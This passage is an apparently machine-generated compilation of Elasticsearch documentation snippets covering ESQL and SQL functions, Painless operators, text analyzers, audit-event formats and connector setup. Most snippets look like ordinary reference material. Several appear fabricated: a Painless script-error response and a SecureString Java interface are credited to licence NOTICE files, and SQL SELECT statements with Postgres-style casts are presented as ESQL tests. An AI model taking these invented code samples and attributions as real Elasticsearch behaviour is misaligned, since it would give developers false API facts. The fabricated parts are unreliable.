JSON\nCODE:\n```\n\"top_hits\":{\"from\":0,\"size\":1,\"version\":false,\"seq_no_primary_term\":false,\"explain\":false,\"docvalue_fields\":[{\"field\":\"keyword\"}],\"sort\":[{\"int\":{\"order\":\"asc\",\"missing\":\"_last\",\"unmapped_type\":\"integer\"}},{\"keyword\":{\"order\":\"asc\",\"missing\":\"_last\",\"unmapped_type\":\"keyword\"}}]}}}}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Top Hits Aggregation for FIRST\nDESCRIPTION: This JSON snippet shows the Elasticsearch aggregation equivalent to the SQL FIRST function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_23\n\nLANGUAGE: JSON\nCODE:\n```\n\"top_hits\":{\"from\":0,\"size\":1,\"version\":false,\"seq_no_primary_term\":false,\"explain\":false,\"docvalue_fields\":[{\"field\":\"keyword\"}],\"sort\":[{\"keyword\":{\"order\":\"asc\",\"missing\":\"_last\",\"unmapped_type\":\"keyword\"}}]}}}}\n```\n\n----------------------------------------\n\nTITLE: Range and Special Character Handling in Character Classes\nDESCRIPTION: Examples demonstrating character ranges and how to handle the hyphen character within square brackets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_11\n\nLANGUAGE: text\nCODE:\n```\n[a-c]   # matches 'a', 'b', or 'c'\n[-abc]  # '-' is first character. Matches '-', 'a', 'b', or 'c'\n[abc\\-] # Escapes '-'. Matches 'a', 'b', 'c', or '-'\n```\n\n----------------------------------------\n\nTITLE: Describing Boolean Conversion Rules in ESQL\nDESCRIPTION: This snippet outlines the rules for converting different input types to boolean values in ESQL. It specifies how string and numerical inputs are handled, including case-insensitivity for string 'true' and the treatment of zero and non-zero numbers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_boolean.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nConverts an input value to a boolean value. A string value of `true` will be case-insensitive converted to the Boolean `true`. For anything else, including the empty string, the function will return `false`. The numerical value of `0` will be converted to `false`, anything else will be converted to `true`.\n```\n\n----------------------------------------\n\nTITLE: Illustrating Identity Equals with Null Values in Painless\nDESCRIPTION: Demonstrates the behavior of the identity equals operator when comparing null values and objects in Painless.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_24\n\nLANGUAGE: painless\nCODE:\n```\nObject a = null;        \nObject b = null;        \nboolean c = a === null; \nc = a === b;            \nb = new Object();       \nc = a === b;            \n```\n\n----------------------------------------\n\nTITLE: Calculating Hyperbolic Cosine in SQL\nDESCRIPTION: The COSH function computes the hyperbolic cosine of a numeric expression. It takes one numeric input and outputs a double numeric value. If the input is null, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_43\n\nLANGUAGE: sql\nCODE:\n```\nCOSH(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Index with Custom Analyzer for Version 5 in JSON\nDESCRIPTION: Sets up an Elasticsearch index with a custom analyzer using standard tokenizer and lowercase filter, and applies it to the content field in the mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\nPUT /index\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"custom_analyzer\": {\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"standard\",\n            \"lowercase\"\n          ]\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"my_type\": {\n      \"properties\": {\n        \"content\": {\n          \"type\": \"text\",\n          \"analyzer\": \"custom_analyzer\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Result Document after Nested Object Processing\nDESCRIPTION: The resulting document after the Foreach processor has uppercase the display_name field in each nested object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_8\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"products\" : {\n    \"widgets\" : {\n      \"total_sales\" : 50,\n      \"unit_price\" : 1.99,\n      \"display_name\" : \"\"\n    },\n    \"sprockets\" : {\n      \"total_sales\" : 100,\n      \"unit_price\" : 9.99,\n      \"display_name\" : \"SUPER SPROCKETS\"\n    },\n    \"whizbangs\" : {\n      \"total_sales\" : 200,\n      \"unit_price\" : 19.99,\n      \"display_name\" : \"WONDERFUL WHIZBANGS\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Detailed Script Error Information in ElasticSearch\nDESCRIPTION: This snippet demonstrates how to retrieve detailed information when a script evaluation fails. It shows the JSON response format that includes a script_stack array and cause object which provides the exception type and reason for the failure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/licenses/slf4j-api-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"error\" : {\n    \"root_cause\" : [\n      {\n        \"type\" : \"script_exception\",\n        \"reason\" : \"runtime error\",\n        \"script_stack\" : [\n          \"... composite array size must be added ...\",\n          \"    sizes[i] = dimension * sizes[i+1];\\n\",\n          \"             ^---- HERE\"\n        ],\n        \"script\" : \"import org.elasticsearch.compute.ann.VectorSimilarity;\\nVector a = [1.0, 2.0, 3.0];\\nVector b = [4.0, 5.0, 6.0];\\nreturn VectorSimilarity.cosineSimilarity(a, b);\",\n        \"lang\" : \"painless\"\n      }\n    ],\n    \"type\" : \"script_exception\",\n    \"reason\" : \"runtime error\",\n    \"script_stack\" : [\n      \"... composite array size must be added ...\",\n      \"    sizes[i] = dimension * sizes[i+1];\\n\",\n      \"             ^---- HERE\"\n    ],\n    \"script\" : \"import org.elasticsearch.compute.ann.VectorSimilarity;\\nVector a = [1.0, 2.0, 3.0];\\nVector b = [4.0, 5.0, 6.0];\\nreturn VectorSimilarity.cosineSimilarity(a, b);\",\n    \"lang\" : \"painless\",\n    \"caused_by\" : {\n      \"type\" : \"illegal_argument_exception\",\n      \"reason\" : \"Dynamic method [java.lang.Math, cosineSimilarity, [double[]              #1<local>, double[] #2<local>]] not found\"\n    }\n  },\n  \"status\" : 500\n}\n```\n\n----------------------------------------\n\nTITLE: Forbidden Path Management APIs with Recommended Replacements\nDESCRIPTION: Lists java.nio.file.* APIs that should not be used directly, recommending PathUtils alternatives instead. These restrictions ensure consistent path handling throughout the Elasticsearch codebase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\njava.nio.file.Paths @ Use org.elasticsearch.core.PathUtils.get() instead.\njava.nio.file.Path#of(java.net.URI) @ Use org.elasticsearch.core.PathUtils.get() instead.\njava.nio.file.Path#of(java.lang.String, java.lang.String[]) @ Use org.elasticsearch.core.PathUtils.get() instead.\njava.nio.file.FileSystems#getDefault() @ use org.elasticsearch.core.PathUtils.getDefaultFileSystem() instead.\n\njava.nio.file.Files#getFileStore(java.nio.file.Path) @ Use org.elasticsearch.env.Environment.getFileStore() instead, impacted by JDK-8034057\n```\n\n----------------------------------------\n\nTITLE: Record Construction Restrictions\nDESCRIPTION: Forbidden record constructors that should only be used within their declaring source files to maintain encapsulation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_8\n\nLANGUAGE: java\nCODE:\n```\norg.elasticsearch.cluster.SnapshotsInProgress$ShardSnapshotStatus#<init>(java.lang.String, org.elasticsearch.cluster.SnapshotsInProgress$ShardState, org.elasticsearch.repositories.ShardGeneration, java.lang.String, org.elasticsearch.repositories.ShardSnapshotResult)\norg.elasticsearch.cluster.SnapshotDeletionsInProgress$Entry#<init>(java.lang.String, java.util.List, long, long, org.elasticsearch.cluster.SnapshotDeletionsInProgress$State, java.lang.String)\n```\n\n----------------------------------------\n\nTITLE: Defining Community ID Processor in Elasticsearch\nDESCRIPTION: Example configuration for the Community ID processor in an Elasticsearch ingest pipeline. This processor computes the Community ID for network flow data without any custom configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/community-id-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"description\" : \"...\",\n  \"processors\" : [\n    {\n      \"community_id\": {\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Custom ICU Tokenizer in Elasticsearch\nDESCRIPTION: This snippet shows the response from Elasticsearch when analyzing text using a custom ICU tokenizer with user-defined rules. The entire input is treated as a single token due to the custom rule.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-tokenizer.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"tokens\": [\n      {\n         \"token\": \"Elasticsearch. Wow!\",\n         \"start_offset\": 0,\n         \"end_offset\": 19,\n         \"type\": \"<ALPHANUM>\",\n         \"position\": 0\n      }\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Date Range Query Result in Elasticsearch\nDESCRIPTION: The result of the range query on the date_range field, showing a successful match with the document that has a time_frame within the queried range.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_4\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 13,\n  \"timed_out\": false,\n  \"_shards\" : {\n    \"total\": 2,\n    \"successful\": 2,\n    \"skipped\" : 0,\n    \"failed\": 0\n  },\n  \"hits\" : {\n    \"total\" : {\n        \"value\": 1,\n        \"relation\": \"eq\"\n    },\n    \"max_score\" : 1.0,\n    \"hits\" : [\n      {\n        \"_index\" : \"range_index\",\n        \"_id\" : \"1\",\n        \"_score\" : 1.0,\n        \"_source\" : {\n          \"expected_attendees\" : {\n            \"gte\" : 10, \"lt\" : 20\n          },\n          \"time_frame\" : {\n            \"gte\" : \"2015-10-31 12:00:00\", \"lte\" : \"2015-11-01\"\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SSL Certificate Example\nDESCRIPTION: Example SSL certificate format for Confluence connector configuration\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-confluence.md#2025-04-21_snippet_2\n\nLANGUAGE: txt\nCODE:\n```\n-----BEGIN CERTIFICATE-----\nMIID+jCCAuKgAwIBAgIGAJJMzlxLMA0GCSqGSIb3DQEBCwUAMHoxCzAJBgNVBAYT\n...\n7RhLQyWn2u00L7/9Omw=\n-----END CERTIFICATE-----\n```\n\n----------------------------------------\n\nTITLE: Type Support Matrix in Markdown Table Format\nDESCRIPTION: Comprehensive table showing supported field types, query types, and their resulting boolean output in ESQL functions. The matrix covers primitive types, date formats, numeric types, text types, and special types like IP addresses and versions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/match_operator.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | query | result |\n| --- | --- | --- |\n| boolean | boolean | boolean |\n| boolean | keyword | boolean |\n| date | date | boolean |\n| date | keyword | boolean |\n| date_nanos | date_nanos | boolean |\n| date_nanos | keyword | boolean |\n| double | double | boolean |\n| double | integer | boolean |\n| double | keyword | boolean |\n| double | long | boolean |\n| integer | double | boolean |\n| integer | integer | boolean |\n| integer | keyword | boolean |\n| integer | long | boolean |\n| ip | ip | boolean |\n| ip | keyword | boolean |\n| keyword | keyword | boolean |\n| long | double | boolean |\n| long | integer | boolean |\n| long | keyword | boolean |\n| long | long | boolean |\n| text | keyword | boolean |\n| unsigned_long | double | boolean |\n| unsigned_long | integer | boolean |\n| unsigned_long | keyword | boolean |\n| unsigned_long | long | boolean |\n| unsigned_long | unsigned_long | boolean |\n| version | keyword | boolean |\n| version | version | boolean |\n```\n\n----------------------------------------\n\nTITLE: Referencing JWT Key Files in Elasticsearch\nDESCRIPTION: This snippet lists the RSA private and public JSON Web Key Set (JWKS) files that are used for JWT authentication in Elasticsearch. These files are generated by the JwtRealmGenerateTests class.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/security/authc/apikey/README.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`rsa-private-jwkset.json`, `rsa-public-jwkset.json`\n```\n\n----------------------------------------\n\nTITLE: SharePoint Drive Items Path Example\nDESCRIPTION: Example showing the structure of SharePoint drive items in different directories\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint-online.md#2025-04-22_snippet_6\n\nLANGUAGE: txt\nCODE:\n```\n/Documents/Report.doc\n/Documents/Spreadsheet.xls\n/Presentations/Q4-2020-Report.pdf\n/Presentations/Q4-2020-Report-Data.xls\n/Personal/Documents/Sales.xls\n```\n\n----------------------------------------\n\nTITLE: Bitwise NOT Operator in Painless\nDESCRIPTION: Demonstrates the bitwise NOT operator ('~') in Painless, which flips the bits of an integer type value. A 1-bit becomes a 0-bit, and a 0-bit becomes a 1-bit. The example shows how it works with byte, int, and long types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_12\n\nLANGUAGE: painless\nCODE:\n```\nbyte b = 1;  <1>\nint i = ~b;  <2>\nlong l = ~i; <3>\n```\n\n----------------------------------------\n\nTITLE: Converting Array of Strings to Lowercase in ESQL\nDESCRIPTION: This snippet shows how to use the TO_LOWER function with an array of strings in ESQL. It creates a row with a variable 'v' that contains the result of applying TO_LOWER to an array of strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_lower.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW v = TO_LOWER([\"Some\", \"Text\"])\n```\n\n----------------------------------------\n\nTITLE: Access Granted Event Logging in Elasticsearch\nDESCRIPTION: JSON structure for logging successful access attempts by authenticated non-system users.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:30:06,947+0200\", \"node.id\":\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"transport\", \"event.action\":\"access_granted\", \"authentication.type\":\"REALM\", \"user.name\":\"user1\", \"user.realm\":\"default_native\", \"user.roles\":[\"test_role\"], \"origin.type\":\"rest\", \"origin.address\":\"[::1]:52434\", \"request.id\":\"yKOgWn2CRQCKYgZRz3phJw\", \"action\":\"indices:data/write/bulk\", \"request.name\":\"BulkRequest\"}\n```\n\n----------------------------------------\n\nTITLE: Calculating Arctangent in SQL\nDESCRIPTION: The ATAN2 function returns the arctangent of two numeric expressions representing coordinates, expressed in radians. It requires two numeric inputs and outputs a double numeric value. If either input is null, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_41\n\nLANGUAGE: sql\nCODE:\n```\nATAN2(\n    ordinate, <1>\n    abscisa)  <2>\n```\n\n----------------------------------------\n\nTITLE: Kuromoji Number Token Filter Analysis Result\nDESCRIPTION: The response showing the conversion result where the Japanese number '一〇〇〇' is converted to the Arabic numeral '1000'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-number.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"tokens\" : [ {\n    \"token\" : \"1000\",\n    \"start_offset\" : 0,\n    \"end_offset\" : 4,\n    \"type\" : \"word\",\n    \"position\" : 0\n  } ]\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Log Function with Base 10 in ESQL\nDESCRIPTION: This SQL query tests the log function with base 10 for various input values. It covers positive numbers, zero, and negative numbers, demonstrating the function's behavior and null handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/log.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    log(10, null::LONG) AS null_long,\n    log(10, null::DOUBLE) AS null_double,\n    log(10, null::INTEGER) AS null_integer,\n    log(10, 1) AS one,\n    log(10, 10) AS ten,\n    log(10, 100) AS hundred,\n    log(10, 0.1) AS tenth,\n    log(10, 0) AS zero,\n    log(10, -1) AS negative;\n```\n\n----------------------------------------\n\nTITLE: User Dictionary Format for Nori Tokenizer\nDESCRIPTION: The format of a user dictionary used by the Nori tokenizer, showing how to define custom nouns and their optional segmentation for compound words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_3\n\nLANGUAGE: txt\nCODE:\n```\n<token> [<token 1> ... <token n>]\n```\n\n----------------------------------------\n\nTITLE: Ingest Script Class Definition\nDESCRIPTION: Defines core methods available in ingest scripts for accessing metadata and fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.ingest.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.IngestScript {\n    Metadata metadata()\n    WriteField field(String)\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Arcsine Using ASIN Function in ESQL\nDESCRIPTION: Demonstrates how to calculate the arcsine (inverse sine) of a decimal value using the ASIN function in Elasticsearch SQL. The example shows the calculation of ASIN(0.9) which returns approximately 1.12 radians.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/asin.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=.9\n| EVAL asin=ASIN(a)\n```\n\n----------------------------------------\n\nTITLE: Using ACOS Function in Elasticsearch SQL\nDESCRIPTION: Returns the arccosine (inverse cosine) of the input numeric expression as an angle in radians. The function takes a numeric input and returns a double value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_35\n\nLANGUAGE: sql\nCODE:\n```\nACOS(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: User Dictionary Format Example\nDESCRIPTION: Example format for Kuromoji user dictionary showing CSV structure with text, tokens, readings, and part-of-speech tags.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-tokenizer.md#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n<text>,<token 1> ... <token n>,<reading 1> ... <reading n>,<part-of-speech tag>\n```\n\n----------------------------------------\n\nTITLE: Update Script Class Definition\nDESCRIPTION: This snippet defines the 'UpdateScript' class, which provides access to script metadata and field manipulation methods in Elasticsearch. It includes a metadata method and a way to work with fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update.txt#2025-04-21_snippet_3\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.script.UpdateScript {\n    Metadata metadata()\n    WriteField field(String)\n}\n```\n\n----------------------------------------\n\nTITLE: Export Client Certificate\nDESCRIPTION: Exports the client's certificate from its keystore\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nkeytool -export -alias test-client -keystore test-client.jks -storepass keypass -file test-client.crt\n```\n\n----------------------------------------\n\nTITLE: Calculating Tangent in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TAN function in ESQL to calculate the tangent of an angle. It creates a row with a value 'a' and then applies the TAN function to it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/tan.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL tan=TAN(a)\n```\n\n----------------------------------------\n\nTITLE: Using Modulus Operator in ESQL\nDESCRIPTION: The modulus operator (%) divides one number by another and returns the remainder. If either operand is a multivalued field, the result is null. This operator is useful for performing modular arithmetic in ESQL queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/layout/mod.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\na % b\n```\n\n----------------------------------------\n\nTITLE: Returning Pi Using ESQL\nDESCRIPTION: This snippet demonstrates how to return the constant Pi, the ratio of a circle's circumference to its diameter, using ESQL. It is generated by ESQL's AbstractFunctionTestCase and is not meant to be edited manually. There are no specific dependencies, and the output is the mathematical constant Pi.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/pi.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW PI()\n```\n\n----------------------------------------\n\nTITLE: Defining SecureString Interface in Java for Elasticsearch\nDESCRIPTION: This snippet defines the SecureString interface, which represents a secure way to store sensitive string data in memory. It includes methods for accessing the character array and destroying the secure string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/accessors-smart-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic interface SecureString extends Releasable {\n    char[] getChars();\n    int length();\n    SecureString clone();\n    void close();\n}\n```\n\n----------------------------------------\n\nTITLE: Testing ESQL Round Function with Negative Precision\nDESCRIPTION: This snippet tests the round function with a negative precision, rounding to digits left of the decimal point.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/round.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT round(123.45, -1);\n```\n\n----------------------------------------\n\nTITLE: Character to String Casting in Painless\nDESCRIPTION: Illustrates how to convert a `char` type value into a `String` type value in Painless using the cast operator. It shows an example of casting the character with ASCII value 65 (A) to its string representation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_9\n\nLANGUAGE: painless\nCODE:\n```\nchar c = 65;          <1>\nString s = (String)c; <2>\n```\n\n----------------------------------------\n\nTITLE: Advanced Remote Recovery Settings in Elasticsearch\nDESCRIPTION: Expert-level settings for fine-tuning remote recovery operations, including concurrent file chunks, chunk size, and timeout configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cross-cluster-replication-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: properties\nCODE:\n```\nccr.indices.recovery.max_concurrent_file_chunks=5\nccr.indices.recovery.chunk_size=1mb\nccr.indices.recovery.recovery_activity_timeout=60s\nccr.indices.recovery.internal_action_timeout=60s\n```\n\n----------------------------------------\n\nTITLE: Result Document after Key Modification\nDESCRIPTION: The resulting document after the Foreach processor has renamed object keys based on display_name values, removing elements with empty display names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_10\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"products\" : {\n    \"Wonderful Whizbangs\" : {\n      \"total_sales\" : 200,\n      \"unit_price\" : 19.99,\n      \"display_name\" : \"Wonderful Whizbangs\"\n    },\n    \"Super Sprockets\" : {\n      \"total_sales\" : 100,\n      \"unit_price\" : 9.99,\n      \"display_name\" : \"Super Sprockets\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SharePoint App Permission XML Configuration\nDESCRIPTION: XML configuration for setting up app permissions in SharePoint Online with full control access to content and read access to social features.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint-online.md#2025-04-22_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<AppPermissionRequests AllowAppOnlyPolicy=\"true\">\n<AppPermissionRequest Scope=\"http://sharepoint/content/tenant\" Right=\"FullControl\" />\n<AppPermissionRequest Scope=\"http://sharepoint/social/tenant\" Right=\"Read\" />\n</AppPermissionRequests>\n```\n\n----------------------------------------\n\nTITLE: Configuring Maven Local Repository in Gradle\nDESCRIPTION: Adds mavenLocal repository to all projects in the Gradle build to resolve local Maven dependencies.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_8\n\nLANGUAGE: gradle\nCODE:\n```\nallprojects {\n  repositories {\n      mavenLocal()\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: API Keys Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Defines the structure of an API keys object in security configuration change events. It includes fields for key IDs, name, ownership status, and user information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_28\n\nLANGUAGE: javascript\nCODE:\n```\n{\"ids\": <string_list>, \"name\": <string>, \"owned_by_authenticated_user\":\n<boolean>, \"user\":{\"name\": <string>, \"realm\": <string>}}\n```\n\n----------------------------------------\n\nTITLE: Running TDVT Tests Against Elasticsearch\nDESCRIPTION: Command to execute the TDVT test suite against the configured Elasticsearch data source. This will run all the test cases and generate reports.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/connectors/tableau/tdvt/README.md#2025-04-21_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n$TDVT run elastic\n```\n\n----------------------------------------\n\nTITLE: Calculating Sine Value Using SIN Function in ESQL\nDESCRIPTION: This example demonstrates how to use the SIN function in ESQL to calculate the sine of a numeric value. It creates a row with a double value and applies the SIN function to compute its sine.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/sin.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL sin=SIN(a)\n```\n\n----------------------------------------\n\nTITLE: LEAST Function\nDESCRIPTION: Returns the smallest non-null value from a list of expressions. All arguments must be of the same data type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nLEAST(\n    expression,\n    expression,\n    ...)\n```\n\n----------------------------------------\n\nTITLE: Reversing a String with REVERSE Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the REVERSE function in ESQL to reverse the characters in a string. It takes an input string 'message' and creates a new reversed string 'message_reversed'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/reverse.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"Some Text\" | EVAL message_reversed = REVERSE(message);\n```\n\n----------------------------------------\n\nTITLE: Analysis Result of Hiragana Uppercase Filter in Elasticsearch\nDESCRIPTION: This snippet shows the result of analyzing Japanese text using the custom analyzer with the hiragana_uppercase filter. It demonstrates how small hiragana characters are normalized to standard forms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-hiragana-uppercase.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n{\n  \"tokens\": [\n    {\n      \"token\": \"ちよつと\",\n      \"start_offset\": 0,\n      \"end_offset\": 4,\n      \"type\": \"word\",\n      \"position\": 0\n    },\n    {\n      \"token\": \"まつ\",\n      \"start_offset\": 4,\n      \"end_offset\": 6,\n      \"type\": \"word\",\n      \"position\": 1\n    },\n    {\n      \"token\": \"て\",\n      \"start_offset\": 6,\n      \"end_offset\": 7,\n      \"type\": \"word\",\n      \"position\": 2\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Detailed Token Analysis Output for Nori Tokenizer\nDESCRIPTION: Response showing detailed linguistic information for each token when analyzing Korean text with the Nori tokenizer, including part-of-speech tags and morphological data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_9\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"detail\": {\n    \"custom_analyzer\": true,\n    \"charfilters\": [],\n    \"tokenizer\": {\n      \"name\": \"nori_tokenizer\",\n      \"tokens\": [\n        {\n          \"token\": \"뿌리\",\n          \"start_offset\": 0,\n          \"end_offset\": 2,\n          \"type\": \"word\",\n          \"position\": 0,\n          \"leftPOS\": \"NNG(General Noun)\",\n          \"morphemes\": null,\n          \"posType\": \"MORPHEME\",\n          \"reading\": null,\n          \"rightPOS\": \"NNG(General Noun)\"\n        },\n        {\n          \"token\": \"가\",\n          \"start_offset\": 2,\n          \"end_offset\": 3,\n          \"type\": \"word\",\n          \"position\": 1,\n          \"leftPOS\": \"JKS(Subject case marker)\",\n          \"morphemes\": null,\n          \"posType\": \"MORPHEME\",\n          \"reading\": null,\n          \"rightPOS\": \"JKS(Subject case marker)\"\n        },\n        {\n          \"token\": \"깊\",\n          \"start_offset\": 4,\n          \"end_offset\": 5,\n          \"type\": \"word\",\n          \"position\": 2,\n          \"leftPOS\": \"VA(Adjective)\",\n          \"morphemes\": null,\n          \"posType\": \"MORPHEME\",\n          \"reading\": null,\n          